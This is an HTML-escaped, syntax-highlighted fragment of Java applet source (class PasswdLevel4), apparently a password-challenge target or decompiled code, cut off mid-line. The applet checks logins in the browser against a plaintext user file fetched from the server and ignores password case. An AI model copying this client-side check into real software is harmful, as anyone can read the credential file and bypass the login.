class=&quot;line&quot;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;202&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.applet.Applet;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.applet.AppletContext;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.awt.*;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.awt.event.ActionEvent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.awt.event.ActionListener;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.*;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.net.MalformedURLException;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.net.URL;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.EventObject;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PasswdLevel4&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Applet&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ActionListener&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; URL finalurl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String infile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String inuser[];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; totno;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    InputStream countConn;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    BufferedReader countData;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    URL inURL;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    TextField txtlogin;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Label label1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Label label2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Label label3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    TextField txtpass;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Label lblstatus;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Button ButOk;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Button ButReset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Label lbltitle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PasswdLevel4&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        inuser = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; String[&lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        totno = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        countConn = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        countData = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        inURL = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtlogin = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TextField();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label1 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Label();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label2 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Label();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label3 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Label();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtpass = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TextField();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lblstatus = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Label();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Button();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Button();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lbltitle = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Label();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ButOk_ActionPerformed&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ActionEvent actionevent)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;boolean&lt;/span&gt; flag = &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt;= totno / &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(txtlogin.getText().trim().toUpperCase().intern() == inuser[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * (i - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;].trim().toUpperCase().intern() &amp;amp;&amp;amp; txtpass.getText().trim().toUpperCase().intern() == inuser[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * (i - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;].trim().toUpperCase().intern())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                lblstatus.setText(&lt;span class=&quot;string&quot;&gt;&quot;Login Success, Loading..&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flag = &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                String s = inuser[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;].trim().intern();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                String s1 = getParameter(&lt;span class=&quot;string&quot;&gt;&quot;targetframe&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(s1 == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    s1 = &lt;span class=&quot;string&quot;&gt;&quot;_self&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    finalurl = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URL(getCodeBase(), s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt;(MalformedURLException _ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    lblstatus.setText(&lt;span class=&quot;string&quot;&gt;&quot;Bad URL&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                getAppletContext().showDocument(finalurl, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lblstatus.setText(&lt;span class=&quot;string&quot;&gt;&quot;Invaild Login or Password&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ButReset_ActionPerformed&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ActionEvent actionevent)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtlogin.setText(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtpass.setText(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;actionPerformed&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ActionEvent actionevent)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Object obj = actionevent.getSource();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(obj == ButOk)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ButOk_ActionPerformed(actionevent);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(obj == ButReset)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ButReset_ActionPerformed(actionevent);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButOk.setEnabled(&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ButReset.setEnabled(&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtlogin.setVisible(&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtpass.setVisible(&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;inFile&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuffer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            countConn = inURL.openStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            countData = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; BufferedReader(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; InputStreamReader(countConn));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            String s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((s = countData.readLine()) != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(totno &amp;lt; &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    totno = totno + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    inuser[totno] = s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    s = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    lblstatus.setText(&lt;span class=&quot;string&quot;&gt;&quot;Cannot Exceed 10 users, Applet fail start!&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    destroy();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt;(IOException ioexception)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            getAppletContext().showStatus(&lt;span class=&quot;string&quot;&gt;&quot;IO Error:&quot;&lt;/span&gt; + ioexception.getMessage());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            countConn.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            countData.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt;(IOException ioexception1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            getAppletContext().showStatus(&lt;span class=&quot;string&quot;&gt;&quot;IO Error:&quot;&lt;/span&gt; + ioexception1.getMessage());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        setLayout(&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        setSize(&lt;span class=&quot;number&quot;&gt;361&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;191&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(txtlogin);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtlogin.setBounds(&lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label1.setText(&lt;span class=&quot;string&quot;&gt;&quot;Please Enter Login Name &amp;amp; Password&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label1.setAlignment(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(label1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label1.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label1.setBounds(&lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;280&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label2.setText(&lt;span class=&quot;string&quot;&gt;&quot;Login&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(label2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label2.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label2.setBounds(&lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label3.setText(&lt;span class=&quot;string&quot;&gt;&quot;Password&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(label3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(txtpass);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtpass.setEchoChar(&lt;span class=&quot;string&quot;&gt;&#39;*&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        txtpass.setBounds(&lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;108&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lblstatus.setAlignment(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label3.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span class=&quot;string&quot;&gt;&quot;Dialog&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        label3.setBounds(&lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;108&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        add(lblstatus);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lblstatus.setFont(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Font(&lt;span 